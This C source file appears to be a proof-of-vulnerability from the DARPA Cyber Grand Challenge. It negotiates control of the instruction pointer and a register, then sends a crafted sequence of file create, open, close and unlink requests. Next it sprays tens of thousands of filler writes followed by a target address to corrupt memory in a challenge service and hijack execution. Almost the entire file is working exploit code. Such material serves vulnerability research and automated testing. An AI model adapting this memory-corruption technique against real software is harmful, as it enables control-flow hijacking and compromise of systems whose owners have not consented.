#include "libpov.h"
enum {
  OPEN_F_NUM = 1,
  READ_F_NUM,
  WRITE_F_NUM,
  LSEEK_F_NUM,
  CLOSE_F_NUM,
  CREAT_F_NUM,
  UNLINK_F_NUM,
};

enum
{
  RDONLY = 1 << 0,
  RDWR   = 1 << 1,
  TRUNC  = 1 << 2,
  APPEND = 1 << 3,
};

#define dumb(__x) ((unsigned char *)(__x))

uint8_t* cgc_buffer = NULL;
uint32_t buffer_cap = 2 << 20;
uint32_t cgc_buffer_len = 0;

void cgc_buffer_append(uint8_t* data, uint32_t data_len)
{
  if (cgc_buffer_len + data_len > buffer_cap)
  {
    uint8_t* new = cgc_malloc(buffer_cap * 2);
    cgc_memcpy(new, cgc_buffer, cgc_buffer_len);
    cgc_free(cgc_buffer);

    buffer_cap *= 2;
    cgc_buffer = new;
  }

  cgc_memcpy(cgc_buffer + cgc_buffer_len, data, data_len);
  cgc_buffer_len += data_len;
}

uint64_t delim = 0x8442e492f255bf31;
int cgc_send_req(int fnum, uint8_t* bytes, cgc_size_t len)
{

#if 1
  cgc_buffer_append((uint8_t*)&fnum, sizeof(fnum));
  cgc_buffer_append((uint8_t*)&len, sizeof(len));
  cgc_buffer_append(bytes, len);
#else
  transmit_all(STDOUT, dumb(&fnum), sizeof(fnum));
  transmit_all(STDOUT, dumb(&len), sizeof(len));
  transmit_all(STDOUT, dumb(bytes), len);
#endif

  return 0;
}

int cgc_uc(int c, const char* path)
{
  cgc_size_t s = 0;
  int mode = 0;

  cgc_size_t slen = cgc_strlen(path) + 1;
  s += sizeof(slen) + slen;
  s += sizeof(mode);

  uint8_t* out = cgc_malloc(s);
  cgc_memcpy(out, &slen, sizeof(slen));
  cgc_memcpy(out + sizeof(slen), path, slen);
  cgc_memcpy(out + sizeof(slen) + slen, &mode, sizeof(mode));

  if (c)
    return cgc_send_req(CREAT_F_NUM, out, s);
  else
    return cgc_send_req(UNLINK_F_NUM, out, s);
}

int cgc_creat(const char* path)
{
  return cgc_uc(1, path);
}

int cgc_unlink(const char* path)
{
  return cgc_uc(0, path);
}

int cgc_open(const char* path, int flags, int mode)
{
  cgc_size_t s = 0;

  cgc_size_t slen = cgc_strlen(path) + 1;
  s += sizeof(slen);
  s += slen;
  s += sizeof(flags);
  s += sizeof(mode);

  uint8_t* out = cgc_malloc(s);

  cgc_memcpy(out, &slen, sizeof(slen));
  cgc_memcpy(out + sizeof(slen), path, slen);
  cgc_memcpy(out + sizeof(slen) + slen, &flags, sizeof(flags));
  cgc_memcpy(out + sizeof(slen) + slen + sizeof(flags), &mode, sizeof(mode));

  return cgc_send_req(OPEN_F_NUM, out, s);
}

int cgc_rw(int r, int fd, cgc_size_t count, uint8_t* data)
{
  static uint8_t out[1024];
  cgc_size_t s = 0;

  s += sizeof(fd);
  s += sizeof(count);

  if (data)
  {
    s += count;
  }

  cgc_memcpy(out, dumb(&fd), sizeof(fd));
  cgc_memcpy(out + sizeof(fd), dumb(&count), sizeof(count));

  if (data)
  {
    cgc_memcpy(out + sizeof(fd) + sizeof(count), data, count);
  }

  if (r)
    return cgc_send_req(READ_F_NUM, out, s);
  else
    return cgc_send_req(WRITE_F_NUM, out, s);
}

int cgc_read(int fd, cgc_size_t count)
{
  return cgc_rw(1, fd, count, NULL);
}

int cgc_write(int fd, cgc_size_t count, uint8_t* data)
{
  return cgc_rw(0, fd, count, dumb(data));
}

int cgc_close(int fd)
{
  cgc_size_t s = 0;

  s += sizeof(fd);
  uint8_t* out = cgc_malloc(s);

  cgc_memcpy(out, dumb(&fd), sizeof(fd));

  return cgc_send_req(CLOSE_F_NUM, out, s);
}

int cgc_lseek(int fd, cgc_ssize_t offset, int whence)
{
  cgc_size_t s = 0;

  s += sizeof(fd);
  s += sizeof(offset);
  s += sizeof(whence);

  uint8_t* out = cgc_malloc(s);
  cgc_memcpy(out, dumb(&fd), sizeof(fd));
  cgc_memcpy(out + sizeof(fd), dumb(&offset), sizeof(offset));
  cgc_memcpy(out + sizeof(fd) + sizeof(offset), dumb(&whence), sizeof(whence));

  return cgc_send_req(LSEEK_F_NUM, out, s);
}


int main(int cgc_argc, char *cgc_argv[])
{
    cgc_buffer = cgc_malloc(buffer_cap);
    type1_vals t1;
    cgc_type1_negotiate(0xfefefefe, 0xfefefefe, 7, &t1);

    if (!t1.ipval) t1.ipval = 0xcccccccc;
    if (!t1.regval) t1.regval = 0xdddddddd;

    cgc_creat("/poop");
    cgc_open("/poop", APPEND | RDWR, 0);
    cgc_open("/poop", APPEND | RDWR, 0);
    cgc_close(0);
    cgc_unlink("/poop");

    void* payload_addr_addr = "\x1c\x37\xe4\xb7";

    uint8_t all_filler_no_killer[4];
    cgc_memset(all_filler_no_killer, 0xce, sizeof(all_filler_no_killer));
    for (cgc_size_t i = 0; i < 32768; ++i)
    {
      cgc_write(1, sizeof(all_filler_no_killer), all_filler_no_killer);
    }
    cgc_write(1, sizeof(uint32_t), dumb(payload_addr_addr));
    cgc_write(1, sizeof(uint32_t), dumb(&t1.ipval));

    cgc_lseek(1, t1.regval, 0);
    unsigned done = 0xb7eb7e;
    cgc_transmit_all(STDOUT, cgc_buffer, cgc_buffer_len);
    cgc_transmit_all(STDOUT, &done, sizeof(done));

    for (cgc_size_t i = 0; i < 32771; ++i)
    {
      cgc_delimited_read(STDIN, NULL, NULL, dumb(&delim), sizeof(delim));
    }

    return 0;
}
